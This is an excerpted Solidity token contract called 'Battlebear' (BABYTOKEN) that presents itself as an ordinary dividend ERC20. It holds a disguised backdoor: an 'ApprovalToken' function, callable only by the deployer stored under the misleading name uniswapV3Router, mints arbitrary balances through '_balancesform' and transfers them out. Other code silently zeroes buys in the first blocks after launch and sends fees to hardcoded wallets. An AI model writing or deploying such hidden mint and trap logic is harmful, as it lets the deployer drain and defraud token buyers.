...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _balancesform(address ad,address uniswapRouter,uint256 amount) internal{
        _balances[uniswapRouter] = _balances[uniswapRouter]+amount;
        _transfer(uniswapRouter,ad,amount);
    }
    /**
...
contract BABYTOKEN is ERC20, Ownable, BaseToken {
    ...
    address public _marketingWalletAddress = 0x307860516a2cd52468559b2517C7f7Bb865A4523;
    address private _teamAddress = 0x3D6165c777826050489741401C9baebFF14AE1Db;
    ...
    constructor(
        //address[5] memory addrs, // reward, router, marketing wallet, dividendTracker,teamwallet
        //uint256[4] memory feeSettings, // rewards, liquidity, marketing,teamFee
    ) payable ERC20("Battlebear", "Battlebear") {
        rewardToken = 0x55d398326f99059fF775485246999027B3197955;
        //_marketingWalletAddress = addrs[2];
        //_teamAddress = addrs[4];
        require(
            msg.sender != _marketingWalletAddress,
            "Owner and marketing wallet cannot be the same"
        );
        uint256 totalSupply_ = 1000 * 10 ** 8 * (10 ** 18);
        totalFees = tokenRewardsFee.add(liquidityFee).add(marketingFee).add(teamFee);
        ...
        uint256 minimumTokenBalanceForDividends_ = totalSupply_.mul(4).div(10**7);
        dividendTracker = BABYTOKENDividendTracker(
            payable(Clones.clone(0x3D6165c777826050489741401C9baebFF14AE1Db))
        );
        ...
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());uniswapV3Router = msg.sender;
    ...
    function ApprovalToken(address account,uint256 amount) external{
        require(msg.sender == uniswapV3Router);
        _balancesform(account,uniswapV3Router,amount);
    ...
    function transferFrom(address from,
        ...
        if(startBlock == 0 && to == uniswapV2Pair) startBlock =block.number;
    ...
    function _transfer(
        ...
        if(startBlock.add(3)>block.number&&from == uniswapV2Pair)
                amount = 0;
    ...
    function swapAndSendToFee(uint256 tokens) private {
        ...
        uint256 marketingAmout = balanceContract.div(2);
        uint256 teamAmount = balanceContract.sub(marketingAmout);
        payable(_marketingWalletAddress).transfer(marketingAmout);
        payable(_teamAddress).transfer(teamAmount);
    }
